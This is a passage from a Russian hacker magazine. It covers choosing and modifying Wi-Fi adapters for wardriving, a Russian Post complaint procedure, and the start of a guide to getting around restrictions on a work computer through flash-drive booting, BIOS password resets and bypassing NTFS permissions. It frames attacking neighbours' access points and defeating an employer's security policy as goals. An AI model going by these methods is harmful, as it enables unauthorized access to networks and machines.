кратилось раза в два. Еще в феврале их в Tor было более 600 штук, сейчас же
в инактив ушло более половины. Рабочих маркетов осталось чуть менее 250.
Стоит учесть и то, что из 250 оставшихся только около 80 представляют неза-
висимые площадки, остальные либо полностью зеркалят известные драг-мар-
кеты, либо парсят базу с основных рынков.

В основном на таких форумах сидят те, кто этим зарабатывает, но бы-
вают и идейные тусовки — как правило, в закрытых конференциях. Боль-
шинство таких причисляют себя к Anonymous, к Легиону. Те же члены группы
Fancy Bear, о которой публиковала отчет Левада, общаются в своей закрытой
конфе и только между собой. Но правда, и от них мы тоже научились получать
информацию — через агентурную сеть. Не могу раскрывать подробности, сам
понимаешь.
 PCZONE
АДАПТЕРЫ
К БОЮ!
 ВЫБИРАЕМ ХАКЕРСКИЙ ДЕВАЙС
 ДЛЯ АУДИТА WI-FI





         84ckf1r3
      84ckf1r3@gmail.com





 Вардрайвинг (обнаружение и взлом точек доступа Wi-Fi)
 требует специального оборудования, но разоряться
 на профессиональные устройства вовсе не обязательно.
 Среди серийно выпускаемых адаптеров Wi-Fi тоже попа-
 даются модели, которые можно превратить в хакерские
 девайсы. Я расскажу, как выбрать такое устройство, где
 его купить и что с ним делать дальше.

 ВНЕШНИЕ WI-FI-АДАПТЕРЫ ДЛЯ ВАРДРАЙВИНГА
 Каждый год на сайте WirelessHack публикуется список лучших Wi-Fi-адаптеров
  для вардрайвинга и обсуждается их совместимость с Kali Linux. Однако в по-
  следнее время этот перечень стал терять свою значимость. Причина проста:
  проверенные модели устройств исчезают из продажи. Вместо них появляются
 удешевленные версии, а то и вовсе выходят новые ревизии с другими чипа-
  ми. Название модели часто остается прежним, а вот ее свойства — нет. Кро-
 ме того, самые популярные адаптеры начинают подделывать, и распознать
  это не так-то просто. Составители списка не могут проверять каждый девайс
  сами. Мы же попробуем частично восполнить этот пробел и описать испытан-
 ную методику выбора.


                                                           Пара адаптеров
                                                            для вардрайвинга





 Современные чипы беспроводной связи занимают площадь в четверть ква-
  дратного сантиметра и меньше. Поэтому адаптеры на их основе выпускаются
  в разных миниатюрных форм-факторах. Они могут быть распаяны на ноутбуч-
  ной карточке Mini PCI, модуле формата M.2 (NGFF) или выполнены в виде кар-
  ты расширения PCMCIA. Нас же интересует более универсальный вариант:
 внешний адаптер c интерфейсом USB, который можно подключить к чему угод-
  но.
    Среди таких адаптеров модели с интерфейсом USB
  3.1 и 3.0 пока еще большая редкость. Основная масса
  по-прежнему выпускается с портом USB 2.0. Ограниче-
  ния по скорости передачи шины (480 Мбит/с) делают та-
  кие адаптеры малопригодными для атак на точки доступа
  (AP) стандарта 802.11ac. Хорошо хоть, большинство AP
  сегодня одновременно вещают и по стандартам b/g/n,      WARNING
  что оставляет широкий простор для вардрайвинга.                                                                             Роскомнадзор
    Зачем покупать отдельный адаптер, если сегодня                                                                                    разъясняет, что
  в любом ноутбуке и планшете есть встроенный модуль         использование
  Wi-Fi? Проблема в том, что обычно он оказывается бес-         Wi-Fi-адаптеров
                                                                                с мощностью излу-
  полезен для пентестов, поскольку его чип нельзя пере-                                                                               чения передатчи-
  ключить в режим мониторинга и тем более использо-        ка более 100 мВт
  вать для инжектирования пакетов. Это возможно только      требует регистрации
                                                                                в соответствии с п. 2  с теми чипами, для которых написаны открытые драй-                                                                                                 ст. 22 Федерального
 веры (нативные или бэкпорты). В Linux (включая Kali) их      закона от 07.07.2003
  подборка обновляется, но медленно. Чтобы такой драй-   № 126-ФЗ «О связи»
                                                                          и Постановлением  вер стал поддерживать очередной адаптер, сообществу
                                                                               Правительства РФ
  нужно получить код прошивки его чипа и набор инженер-                                                                                    от 12 октября 2004
  ных программ, специфичных для каждого вендора.               года № 539 (с изм.).

Как выбирать адаптер

Списки совместимых с Linux моделей адаптеров быстро устаревают, поэтому
напишу общую методику выбора. Открываем список драйверов Wi-Fi-адапте-
ров для Linux. Выбираем из них только поддерживающие мониторинг и инжек-
ты. Открываем описание каждого драйвера и смотрим список поддерживае-
мых им чипов. Ищем модели на этих чипах по базе wikidevi.com и оставляем
в сухом остатке только подходящие — по интерфейсу, дате начала производ-
ства, мощности и прочим характеристикам. Затем покупаем, вскрываем кор-
пус, проверяем маркировку чипа и тестируем адаптер. Его способность де-
лать инжекты можно проверить так: aireplay-ng -9.



  Производители редко раскрывают детальные спецификации, поэтому гаран-
  тированно подходящие чипы во многих статьях про вардрайвинг упоминаются
  одни и те же — перепечатанные из документации по Kali. Это Realtek 8187L,
 Qualcomm Atheros AR9271(L), Ralink RT3070(L) и Ralink RT3572(L). Однако со-
  вместимых решений на рынке гораздо больше. Переключаться в режим мони-
  торинга и инжектировать пакеты могут адаптеры на десятках других чипов.
    Для «дальнобойных» стандартов 802.11b/g это Ralink RT2070, RT2571W
  и RT2671, а также Intersil ISL3880, ISL3886 и ISL3887.
    Более современные стандарты b/g/n поддерживают совместимые с Kali
  чипы Ralink RT2770, RT2870, RT3071, RT3072, RT3370, RT5370, RT5372,
  RT8070, а также Atheros AR7010 и AR9271L.
    Расширенный набор a/b/g/n поддерживают чипы RT3572, RT5572 и AR9170
  (draft-n). Соответствующие им функции в  Linux обеспечивают драйверы
  p54usb, rt2500usb, rt2800usb, rt73usb, carl9170, ath5k, ath9k и ath9k_htc. Боль-
 ше всего подходящих адаптеров основано на чипах Ralink, которые во второй
  версии Kali Linux работают с драйвером rt2800usb.

 Список современных USB Wi-Fi адаптеров, которые
 поддерживаются в Kali Linux

 Совершив несколько рейдов на отечественные и зарубежные магазины техники,
  я составил перечень проверенных в Kali моделей, продающихся сегодня. Обра-
  ти внимание на номер версии и ревизии, это важно! Всего одна другая буква
  или цифра, и внутри окажется другой чип, бесполезный для вардрайвинга.

 На частоте 2,4 ГГц по стандартам b/g/n работают адаптеры:
  1.  Alfa Network TUBE-U (RT3070).
  2. Tenda UH150 (RT3070).
  3. Tenda W311M (RT5370).
  4. Tenda W311MI (RT5370).
  5. Tenda W322UA (RT3072).
  6. Tenda W322U v3 (RT5372).
  7. D-Link DWA-125 rev B1 (RT5370).
  8. D-Link DWA-140 rev B3 (RT5372).
  9. D-Link DWA-140 rev D1 (RT5372).
  10. TP-LINK TL-WN727N v3 (RT5370).

 С расширенным набором стандартов a/b/g/n на частоте 2,4 ГГц работают:
  1. ASUS USB-N53 (RT3572).
  2. Tenda W522U (RT3572).

 В двухдиапазонном режиме (2,4 и 5 ГГц) по стандартам a/b/g/n или n:
  1. D-Link DWA-160 rev B2 (RT5572).
  2. Netis WF2150 (RT5572).
  3. TP-LINK TL-WDN3200 (RT5572).

 В этом списке перечислены только современные USB Wi-Fi адаптеры с полной
 поддержкой в Kali Linux (режим мониторинга + инжектирование пакетов). Все
  указанные модели были выпущены после 2010 года. Конечно, перечень можно
 было бы продолжить, включив старые модели, — наиболее выдающиеся будут
  упомянуты ниже.



 ПОПУЛЯРНЫЕ ЧИПЫ И ИХ ОСОБЕННОСТИ
 Может показаться, что выбрать USB-адаптер для аудита беспроводных се-
  тей просто. В теории достаточно купить любой девайс с подходящим чипом,
  и можно отправляться покорять точки доступа. На практике же есть масса нео-
  чевидных вещей и важных деталей.

 Realtek 8187L (802.11b/g, 2,4 ГГц)
 Это старый чип, работающий только по стандартам 802.11b/g. Однако ста-
 рый — не значит плохой. В 2007 году на нем был сделан легендарный адаптер
  Alfa AWUS036H, бьющий рекорды дальности связи. С ним можно вардрайвить
  точки доступа не только у соседей, но и в другом здании. Остается лишь обна-
  ружить хотспоты, все еще вещающие по стандартам b/g.
    Как и с любой «Альфой», главная проблема — купить оригинал. Коробку
  и даже фирменные голограммы подделывать научились давно, поэтому гаран-
  тированный вариант только один — вскрывать корпус. Ищи металлические за-
  щелки, металлическую пластину над платой из синего текстолита, а главное —
  смотри, чтобы MAC-адрес совпадал на плате, корпусе и коробке. Чтобы точно
  не промахнуться, можно проверить валидность адаптера на сайте по MAC-а-
  дресу и серийному номеру.

 RT3070 (802.11b/g/n, 2,4 ГГц)
  Этот чип стал одним из первых для вардрайвинга AP, вещающих в стандарте
  802.11n. Даташит (pdf) на него появился в сентябре 2008 года. Тогда Kali Linux
 еще не было, а драйвер с поддержкой режима мониторинга добавили в дис-
  трибутив ее предшественника — BackTrack. В 2011 году MediaTek объедини-
  лась с корпорацией Ralink Technology, поэтому иногда можно встретить дру-
  гое обозначение этого чипа — MediaTek RT3070.
    К настоящему времени на базе RT3070 выпущено более 150 устройств,
  но степень их пригодности для вардрайвинга разная. С этим чипом надо быть
  особенно внимательным, поскольку выпускается он как минимум в двух ре-
  визиях. Для аудита желательно брать именно RT3070 ревизии AL1A. Удешев-
  ленная ревизия AL3A хуже — слабее, да и работает менее стабильно. Она
  используется в чипах с маркировкой 3070L, но не все продавцы указывают по-
 следнюю букву. Поэтому читай отзывы, сверяй VID и PID, а лучше — проверяй
  обозначение на самом чипе. Большинство адаптеров открываются элемен-
  тарно: корпус у них либо пластиковый на защелках, либо склеенный из двух по-
  ловинок. Последний можно аккуратно открыть, слегка прогрев торцы феном.
    Из проверенных адаптеров на базе RT3070 можно рекомендовать Alfa
 AWUS036NH и
      Alfa AWUS036NEH. Интересно, что китайский адаптер EDUP EP-MS8515GS
  на том же чипе внешне копирует не их, а более новую модель «Альфы» —
 AWUS036ACH. У него две штыревые антенны с заявленным коэффициентом
  усиления по 6 дБи. Работает он весьма неплохо, особенно с учетом своей не-
  высокой цены.
    Другой адаптер с чипом RT3070 — Tenda UH150/N150. Заявленная мощ-
  ность его передатчика составляет 27 дБм (против обычных 14–20 дБм), а ко-
 эффициент усиления всенаправленной антенны — 5 дБи. Этот адаптер прода-
  ется во многих российских магазинах за эквивалент 10–12 долларов. Можно
  сэкономить пару баксов, если тебе не критично ждать посылки из Поднебес-
  ной. Однако пригодится он только для вардрайвинга ближнего радиуса дей-
  ствия. Почему? Как оказалось, заявленные характеристики не соответствуют
  действительности.





   Большой адаптер
    потребляет всего 100
   мА в режиме мониторинга

 Обнаружив это, я первым делом стал грешить на комплектный провод USB —
  уж очень он был длинный и тонкий, то есть обладал большим сопротивлением.
 Однако его замена на кабель получше ничего не принесла. Адаптер по-преж-
  нему видел восемь-девять точек доступа там, где другие ловили двадцать
  и больше.





    Замена
    кабеля ничего
    не дала

  Вскрытие показало, что внутри устройства стоит все та же урезанная версия
  чипа с индексом L, а на плате (судя по разметке) отсутствует часть элементов.





    Внутренности
    Tenda UH150

 Несмотря на большую антенну и корпус солидных размеров, мощность адап-
  тера на практике оказалась очень низкой.
   В качестве мощного и дешевого адаптера на форумах часто советуют KuWfi
  Blueway BT-N9000. У него всенаправленная антенна с заявленным коэффици-
  ентом усиления 8 дБи (по моим ощущениям — реально около 5 дБи). Паспорт-
 ные данные о потребляемой мощности 2 Вт стоит воспринимать аналогично.
 На деле мощность лишь немного выше, чем у большинства USB-адаптеров
  в этой ценовой категории. Возможно, с N9000 удастся увидеть еще несколь-
  ко точек доступа вокруг или чуть быстрее побороть ближайшую. Своих денег
  адаптер стоит, но не более того.
    Модель Netsys 9000WN подкупает солидными размерами, но это как раз
 пример легкого обмана: вместо RT3070 в нем используется RT3070L.





    Плата с чипом
    RT3070L

 Однако у этого адаптера довольно качественная панельная антенна, поэто-
 му его можно рекомендовать для разведки радиоэфира или в качестве доно-
  ра для перепайки антенны другому устройству. Заявленные характеристики
  не привожу, поскольку они выглядят бредово — даже не совпадают в разных
  абзацах описания. Однако такие косяки типичны для большинства китайских
  товаров. На практике девайс радует чувствительностью приема. Там, где
  на другие адаптеры ловится от силы двадцать хотспотов, он легко находит
 больше пятидесяти, особенно если его медленно вращать на манер радара.
 Несмотря на внушительные размеры, в режиме мониторинга адаптер потре-
  бляет менее 850 мВт.





   Большой —
    не значит мощный

 Из особенностей антенны Netsys 9000WN отмечу диаграмму направленно-
  сти. Ее ширина составляет около 60° в горизонтальной плоскости и 90° в вер-
  тикальной. На практике такая панельная антенна дает что-то среднее между
 обычной штыревой и направленной Уда — Яги (известной советским инже-
 нерам как «волновой канал»). Поэтому точное направление на точку доступа
  с ней подобрать трудно.





    Панельная антенна


 Приемником в этой антенне служит группа симметрично расположенных над
  стальным экраном (180 x 160 мм) металлических излучателей одинакового
  размера. Они представляют собой квадраты со стороной 53 мм и размещены
  на таком же расстоянии друг от друга. Расстояние между ними и экраном — 7
  мм. Оплетка антенного кабеля соединяется с экраном, а его центральная жила
  припаивается к металлическим полоскам.
    Помимо качественной антенны, у этого адаптера есть еще одно достоин-
  ство — цена. В России одна такая панелька обойдется дороже 35 долларов,
  а тут она используется в готовом устройстве, да еще вместе с чипом, кото-
 рый поддерживается в Kali. Минус — это довольно старый и урезанный чип
  RT3070L. Напрашивается очевидное решение: заменить плату, вытащив ее
  из корпуса другого адаптера с более интересным чипом, благо в подставке
  антенны достаточно места. Для апгрейда потребуется не только припаять вы-
 воды антенны, но и заменить полноразмерный порт USB на mini-USB.



                             Продолжение статьи
PCZONE



    Начало статьи
АДАПТЕРЫ
                   ВЫБИРАЕМ
                     ХАКЕРСКИЙ
                    ДЕВАЙС
                    ДЛЯ АУДИТА
                             WI-FIК БОЮ!



Qualcomm Atheros AR9271 (802.11b/g/n, 2,4 ГГц)
В 2013 году компания Qualcomm открыла исходный код прошивки и SDK
для AR9271 под лицензией MIT. Поэтому AR9271 стал одним из самых попу-
лярных чипов для вардрайвинга в последнее время. На нем основано множе-
ство адаптеров, самым известным из которых считается Alfa AWUS036NHA.
Модель настолько популярна, что под нее есть множество подделок. Напри-
мер, вот это — подделка. Некоторые вардрайверы покупают ее, соблазнив-
шись ценой, а потом пишут разочарованные отзывы, вроде: «Ожидал больше-
го от Альфы!» Так это и не Alfa Networks делала, какие к ней претензии?





                                                   Фальшивые «Альфы»

Настоящую «Альфу» в России продают дорого, а ждать ее доставки из дру-
гих стран слишком долго. Поэтому нетерпеливые покупатели обращают вни-
мание на более дешевые адаптеры с таким же чипом. Например, TP-LINK
TL-WN722N. При довольно мощном передатчике (20 дБи) он радует доступ-
ностью (до сих пор продается в десятках российских магазинов за эквивалент
8-10 долларов) и возможностью подключения любой внешней антенны. Кос-
венно о мощности адаптера можно судить по значению потребляемой мощно-
сти. В пике оно почти вдвое выше, чем у огромного Netsys 9000WN.





                                                 TL-WN722N потребляет 1360
                                                 мВт в режиме мониторинга


При прочих равных лучше выбирать адаптеры именно со съемными антенна-
ми. Если в них используются стандартные разъемы SMA, то ты без труда заме-
нишь штатную на более мощную, сможешь использовать направленную антен-
ну или даже добавить усилитель сигнала.
   Если хочешь экспериментов и есть время подождать, то можешь попро-
бовать более дешевый аналог TL-WN722N, выпускаемый под известнейшим
китайским брендом NoName. Просто помни, что одинаковые с виду адаптеры
(и даже сделанные на одинаковом чипе) могут отличаться элементной базой
и распайкой.
   Реже встречается обратная ситуация: можно найти довольно точный клон
известной модели, единственным заметным отличием которого будет лого-
тип. К примеру, есть такой адаптер, как Sophos AP 5 Rev 1. Его можно реко-
мендовать тем, кому нужен экстремально дешевый вариант, но с более-менее
приличными характеристиками.
   Интересно, что у чипа AR9271 предусмотрено две цепи RX/RF, но боль-
шинство производителей адаптеров ставят только одну антенну ради удешев-
ления.

Ralink RT5572
Это один из самых современных чипов, работающий в двух диапазонах:
802.11a/b/g/n в диапазоне 2,4 ГГц и 802.11n на частоте 5 ГГц. На его основе
выпускается адаптер Netis WF2150, стоящий 15–17 долларов. Низкая цена —
единственный плюс этого адаптера. Потребляемая мощность в режиме мони-
торинга колеблется в пределах 750–850 мВт, так что мощным его не назовешь.


  Двухдиапазонный адаптер





Внешних антенн у адаптера нет, а с миниатюрными встроенными можно атако-
вать точку доступа только в упор. Их коэффициент усиления не превышает 1,5
дБи в диапазоне 2,4 ГГц и 3,5 дБи в диапазоне 5 ГГц. Для вардрайвинга требу-
ется привычная доработка: надо подключить к адаптеру внешнюю антенну —
например, снятую с «донора» или самостоятельно изготовленную панельную.
Между внутренними микроантеннами на плате есть разъем IPX, что сильно
упрощает подключение внешней антенны с помощью кабеля-переходника или
пигтейла.





                                   На встроенные антенны много не поймаешь


Kali Linux и 5 ГГц


С вардрайвингом на частоте 5 ГГц есть свои сложности. Во-первых, из-за вы-
сокой частоты сигнал быстрее затухает. Если точку доступа 802.11g, которая
вещает в режиме 2,4 ГГц, можно поймать хоть за километр, то пятигигагер-
цевые тухнут уже в паре десятков метров даже при использовании стандарта
802.11n. К такой цели придется подобраться поближе.
   Во-вторых, для мониторинга пятигигагерцевых точек доступа потребуется
утилита с такой функцией. В Kali Linux 2.0 есть программа WiFite r87, которая
видит только AP с частотой 2,4 ГГц.





                                               WiFite r87 не мониторит AP на частоте 5 ГГц

Решается эта проблема установкой WiFite 2.0.

git clone https://github.com/derv82/wifite2.git

Далее достаточно перейти в директорию Wifite2/

cd wifite2/

и запустить скрипт с новой командой отображения AP, вещающих на частоте 5 ГГц

./Wifite.py -5





                                                          WiFite 2.00 поддерживает 5 ГГц

Если залогинился не под рутом, то перед последней командой требуется до-
бавить sudo.





                                                 WiFite 2.00 нашел AP на канале 36 (5 ГГц)

Перед сканированием может быть полезно установить обновленные прошив-
ки следующей командой (пример для чипов Ralink):

# apt-get update && apt-get install firmware-ralink

Для других адаптеров (например, Atheros) команда аналогичная, меняется
лишь название вендора.



В КАЖДОМ КОРПУСЕ — СЮРПРИЗ!
Наверняка ты не раз наталкивался на расхожую фразу: «Производитель мо-
жет изменять технические и потребительские свойства товара без уведомле-
ния». На практике это означает, что, купив одну и ту же модель адаптера Wi-Fi
из разных партий, внутри можно обнаружить разные чипы. Хорошо еще, если
они оба будут в списке совместимых с Linux. Например, в первых сериях адап-
тера Tenda W322UA был установлен чип RT3072. Теперь в них встречается
более новый RT5372L — такой же, как в Tenda W322U v3. Налицо унификация
производства, но проблема в том, что никаких новых обозначений на устрой-
стве не появилось — ни версии, ни ревизии.





                                     Сюрпризы бывают приятными... и не очень


Выглядит W322UA интересно, однако чип в нем удешевленной версии,
а от пары мелких штырьковых антенн мало толка. Они слегка увеличивают
скорость передачи данных (благодаря использованию схемы MIMO 2x2:2)
в ущерб мощности сигнала. Крошка потребляет всего 660 мВт и уверенно ло-
вит AP только вблизи. Сигнал от роутеров, расположенных за стенкой, с ней
всегда будет в красной зоне.





                                                   Когда две антенны хуже одной

Для вардрайвинга лучше взять одну антенну помощнее, но в этом адаптере
они несъемные. Радует, что выводы антенного кабеля вынесены на плате от-
дельно. Они находятся далеко от чипа, поэтому его не перегреешь, когда бу-
дешь припаивать другую антенну.

КИТАЙСКИЕ ВАТТЫ И ДЕЦИБЕЛЫ
Мощность сигнала — залог успешного вардрайвинга, но это понимают и про-
давцы. Лишенные остатков совести, они завышают характеристики товара
в разы и пускаются на любой обман. Например, в перепечатках прошлогодних
статей до сих пор советуют купить у китайцев устройство High Power SignalKing
48DBI. Один из коллег решил проверить и посмотреть, что у этого чудесно-
го адаптера внутри. Посылка шла почти два месяца и... лучше бы она потеря-
лась. Вскрытие присланного образца показало, что всенаправленные антен-
ны в этом адаптере — муляж, а направленная гораздо
меньше по размеру, чем ожидаешь, глядя на размеры
корпуса. Конечно же, коэффициент усиления панель-
ной антенны и близко не соответствует заявленному.
Говорите, 48 дБи? Там даже не восемь. Другие адапте-
ры от известных брендов показывают близкий резуль-
тат — в них используются качественные штырьковые     WWW
антенны на 5–6 дБи. Да и связь с ними более стабиль-                                                                     База данных, содержа-
ная, чем с самопровозглашенным «Королем сигнала».     щая сведения о более чем
   Увы, эта история — правило, а не исключительный      5300 адаптерах Wi-Fi
случай. На большинство товаров надо смотреть скеп-                                                                             Cst Microwave Studio —
тически и не лениться считать. Например, от USB-пор-                                                                    программа для элек-
та с предельным током 500 мА и рабочим напряжением        тродинамического
5 В невозможно запитать нагрузку, потребляющую бо-    моделирования и расчета
                                                                       параметров антенн
лее 2,5 Вт. Тебе предлагают USB-адаптер мощностью
9 Вт? Улыбнись и ищи другой. С антенной на 100500     Cantennator — бесплатное
дБи? Свяжись с ПВО! Кто-то украл у них РЛС!                 русскоязычное приложе-
                                                                     ние для Android по расче-   Покупка в местном магазине не избавляет от не-                                                                                       ту антенн
обходимости думать и проверять. Ты просто будешь
меньше ждать и проще вернешь подделку, но запла-      Русскоязычная справка
                                                                           по WiFiteтишь за то же самое гораздо больше. Логично, что за-
казывать китайские товары дешевле в китайских мага-                                                                          Русский форум
зинах. Помимо AliExpress, есть DealExtreme, FocalPrice,        по вардрайвингу
JD и множество других.
   Лайфхак: подходящие адаптеры ищутся в интернет-магазинах по названию
чипа, а также по упоминанию Kali Linux, BackTrack, Beini и Xiaopan. Фильтро-
вать поисковую выдачу лучше не по цене, а по рейтингу продавца и количе-
ству отзывов. На популярную вещь их всегда сотни, и попадаются фотографии
и результаты проверки.

«Почта России» без боя не сдается!

Наша почта любые претензии к состоянию посылок любит перенаправлять
в dev/null или к таможне (особенно если нарушена целостность пакета). Де-ю-
ре таможня может досматривать международные посылки, но де-факто она
редко пользуется таким правом. Поток у них настолько большой, что даже
в спокойный период на любой таможне успевают проверять максимум каждое
пятое отправление. Если же при получении ты видишь следы вскрытия (напри-
мер, пакет заклеен скотчем), то не верь в истории о тотальных проверках. Все
вскрытые на таможне пакеты заклеиваются лентой с логотипом ФТС, а к от-
правлению прикладывается акт. Все остальное — откровенное воровство со-
трудников службы доставки.
  В последнее время «Почта России» активно борется с этим позорным явле-
нием. Поэтому, если ты обнаружил, что пакет был вскрыт или его масса не со-
впадает с указанной в извещении, действуй по следующему алгоритму.
1. Не принимай пакет и не подписывай извещение.
2. Позвони по бесплатному телефону горячей линии 8-800-2005-888 и внятно
   изложи ситуацию. Обязательно укажи номер отделения почты и трекинго-
   вый номер отправления.
3. Вызывай начальника почтового отделения или сотрудника, временно выпол-
   няющего его обязанности. Да, именно в такой последовательности: звонок,
   потом разбирательство на месте. Без волшебного пинка сверху оно будет
   длиться вечно.
4. Требуй выдать бланк для составления акта о вскрытии международного от-
   правления.
5. Заполняй его за столиком в поле зрения камеры видеонаблюдения (сейчас
   они есть почти в каждом отделении). Там же вскрывай посылку вместе с на-
   чальником отделения. В случае отказа сделать это вновь звони по телефону
   горячей линии и сообщай фамилию сотрудника, отказавшего тебе в закон-
  ном требовании.
6. Если тебе сразу начинают хамить и кричать, что ничего сделать нельзя, вы-
   зывай наряд полиции. Это кража, и раскрыть ее по горячим следам обычно
   не составляет большого труда. Почему? Из-за малого круга подозреваемых
   и детальной документации.

На каждом пункте приема и передачи посылок проверяется их масса, а все
данные заносятся в базу. Поэтому место преступления очевидно в первые ми-
нуты расследования. Обычно это последнее звено в цепочке, то есть то самое
отделение, куда ты пришел получить свою бандерольку. Помни, что прибывший
по твоему вызову оперуполномоченный имеет куда больше полномочий (по-
этому его так и назвали, хе-хе) и методов воздействия на сотрудников почты,
чем ты. А еще у него есть показатели эффективности работы. Возможно, он
даже будет счастлив, что его вызвали расследовать свежее и подробно задо-
кументированное уголовное преступление (ст. 158 УК РФ — кража). Содержи-
мое посылки его интересует только в этом аспекте. Поскольку ты в данной си-
туации — заявитель и потерпевшая сторона, то никаких встречных обвинений
ждать не стоит. Практически всю китайскую технику можно классифицировать
как потребительскую электронику, купленную за рубежом ради экономии. Ко-
нечно, если она не стреляет и не выглядит как откровенно шпионский девайс.
PCZONE
 ВЕРНИТЕ




        КАК ОБОЙТИ ОГРАНИЧЕНИЯ ПРАВА!
        НА РАБОЧЕМ КОМПЬЮТЕРЕ





                                                                                        84ckf1r3
                                                                                            84ckf1r3@gmail.com



Когда ты приходишь на работу и обнаруживаешь, что
на компьютере что-то запрещено, а в Сети — заблоки-
ровано, это воспринимается практиче-
ски как вызов. В своей статье я расска-
жу, какие бывают методы ограничений
и как с ними бороться. Многие из описан-
ных трюков мне приходилось проделы-                                               WARNING
вать самостоятельно — конечно же, ис-
                                                                     Нарушение политики
                                                                              безопасностиключительно с благими намерениями.
                                                                        может повлечь
                                                                         административную
Понятно, что ограничения важны для безопасности                и уголовную
и снижения нагрузки на эникейщиков, но обычно уро-             ответственность
                                                                               в зависимости отвень технической подготовки у сотрудников разный,
                                                                        соотношения твоей
а правила одни на всех. Если ты чувствуешь, что ограни-                                                                             наглости и удачливости.
чения мешают работе и личной свободе, а также здра-      Редакция и автор не несут
во оцениваешь последствия, то у тебя есть все шансы       ответственности за любой
                                                                      возможный вред.собственноручно улучшить условия.

В ЧУЖОЙ МОНАСТЫРЬ СО СВОЕЙ ФЛЕШКОЙ
Получение нужных прав на рабочем компьютере в общем случае начинает-
ся с загрузки другой ОС с набором «хакерских» утилит. Мы уже писали о том,
как создать мультизагрузочную флешку, а сейчас пройдемся по важным дета-
лям.
   Бывает, что загрузиться с проверенной флешки или Live CD очень непросто
даже при наличии физического доступа к компьютеру. Загрузка с произволь-
ного носителя не представляла проблем до появления EFI. Просто входишь
в настройки BIOS и меняешь порядок загрузки в разделе Boot. На одних ком-
пах для этого надо было нажать Delete, на других F2 — в любом случае нужная
клавиша указывалась на экране или в мануале. Сейчас же в UEFI используется
список доверенных загрузчиков и два разных режима стартовой последова-
тельности, а загрузка Windows 8, 8.1 и 10 для ускорения может происходить
прямо из EFI безо всяких предложений войти в настройки.
   Если ты сразу видишь загрузку Windows и не успеваешь ничего сделать, то
дождись ее запуска и выполни одно из следующих действий:
1. Нажми «перезагрузить» на экране приветствия Windows, удерживая левую
   клавишу Shift.
2. Уже после загрузки зайди в «Параметры   Обновление и безопасность
     Восстановление   Особые варианты загрузки». Нажми «Перезагрузить
   сейчас   Поиск и устранение неисправностей   Дополнительные параме-
   тры  Параметры загрузки».
3. Как вариант — можешь ввести shutdown.exe /R /O в командной строке.

Независимо от выбранного способа произойдет перезагрузка с выбором па-
раметров, и ты сможешь оказаться в настройках BIOS/UEFI.
   Если права жестко ограничены и войти в настройки Windows 10 софтовым
методом невозможно, можешь попробовать физически отключить HDD/SSD.
Тогда при следующей загрузке появится сообщение об ошибке и отобразится
пункт для входа в UEFI.
  Может показаться, что отключить питание HDD на рабочем компьютере
сложно, особенно если корпус опечатан. Просто нажми на пластиковую за-
глушку слота 5,25″, которая обычно располагается на фронтальной панели.
Чуть сильнее. Я сказал: «чуть»! Чувствуешь, как прогибается? Продавив ее
миллиметра на три, попробуй ухватить край и вытащить заглушку. В образо-
вавшееся отверстие спокойно пролезает рука до середины предплечья, даже
если ты регулярно ходишь в качалку. Через эту амбразуру при должной ловко-
сти можно не только кабель отключить, но и почти весь комп перебрать. Метод
напоминает ремонт двигателя через выхлопную трубу, но действует в реаль-
ной жизни. Исключение составляют нестандартные корпуса — например, пол-
ностью алюминиевые.

Быстрая загрузка с флешки

Облегчить жизнь может опция быстрого выбора загрузочного устройства, ре-
ализованная в некоторых прошивках. Если она есть и активна, то при включе-
нии компьютера помимо сообщения «Press [key] to enter setup» появится еще
одно: «... or [key] for boot menu». Обычно это клавиши Enter, F1 — F12, их со-
четания с клавишами Alt, Ctrl, Ins и Esc. Полный список вариантов занял бы
не одну страницу, так что лучше искать ответ в мануале к конкретной материн-
ской плате.



Так или иначе, ты попадаешь в настройки BIOS. С большой вероятностью
для загрузки с флешки также придется изменить параметр Boot List Option.
По умолчанию он обычно стоит в новом режиме UEFI, а на флешке используется
GRUB с запуском через MBR. Поэтому нам нужен либо старый режим Legacy/
CSM, либо оба, но с приоритетом классического: Legacy/CSM + UEFI. Иногда
этот пункт отсутствует в списке. Тогда поддержку Legacy придется предвари-
тельно активировать на другой вкладке. Обычно этот пункт называется Load
Legacy Option Rom. Там же отключается защищенный метод загрузки Secure
Boot. При желании можно не отключать его, а добавить собственные ключи до-
веренных загрузчиков, но описание этого метода выходит за рамки статьи.
   Другим препятствием может стать парольная защита BIOS/UEFI. Напоми-
наю, что пароль обычно записан с обратной стороны батарейки на материн-
ской плате. Просто вытащи ее и переверни. Как не видишь пароля? Стран-
но... Ладно, вставляй обратно. Пока ты крутил батарейку, он испарился вместе
с другими данными CMOS. Если ветеринарные методы компьютерных опера-
ций тебе чужды или открыть корпус проблематично (например, он стоит у всех
на виду), то попробуй ввести инженерный пароль. Он гуглится по производите-
лю BIOS и общий у всех материнских плат одной серии.
   Другой способ софтового сброса пароля на вход в BIOS — вызвать ошибку
в контрольной сумме блоков данных. Для этого есть утилита Кристофа Гренье
CmosPwd. Она прямо из Windows делает запись в CMOS. Метод не сработает,
если утилиту заблокирует антивирус или если перезапись CMOS была предва-
рительно отключена на низком уровне.

INFO

На некоторых ноутбуках, ультрабуках и неттопах временное обесточивание
CMOS не приводит к сбрасыванию пароля на вход в BIOS/UEFI, поскольку он
хранится в отдельной микросхеме энергонезависимой памяти. В таких случа-
ях можно восстановить пароль по коду ошибки. Этот код отображается после
трехкратного ввода неправильного пароля и представляет собой хеш от со-
храненного пароля. Поскольку хеш-функции необратимы, то вычислить пароль
напрямую нельзя. Однако существуют программы, подбирающие пароль с та-
ким же значением свертки. Это может быть как заданный пароль, так и другая
комбинация символов, дающая такой же хеш при проверке. Зайти в настройки
можно по любому из них, так как проверяется именно хеш. Обрати внимание,
что на некоторых ноутбуках Dell при вводе пароля надо нажимать Ctrl + Enter.
Если ничего не помогло, то остается воспользоваться паяльником и програм-
матором, но это уже хардкор для инженеров сервис-центров.



ОТКРЫВАЕМ ДОСТУП К ДИСКУ
Итак, предположим, что мы успешно загрузились с флешки и готовы к подвигам.
С чего начнем? Первое ограничение, с которым сталкивается обычный пользо-
ватель, — отсутствие прав чтения и записи в определенных каталогах. Свобод-
но использовать он может только домашнюю папку, что не слишком удобно.
   Такие ограничения заданы на уровне списков управления доступом в фай-
ловой системе NTFS, но сверяться с ними обязана только сама винда. Другие
ОС и отдельные утилиты способны игнорировать эти ограничения. Например,
Linux и программы для восстановления данных не используют WinAPI, а обраща-
ются к диску либо через свои драйверы, либо напрямую. Поэтому они просто
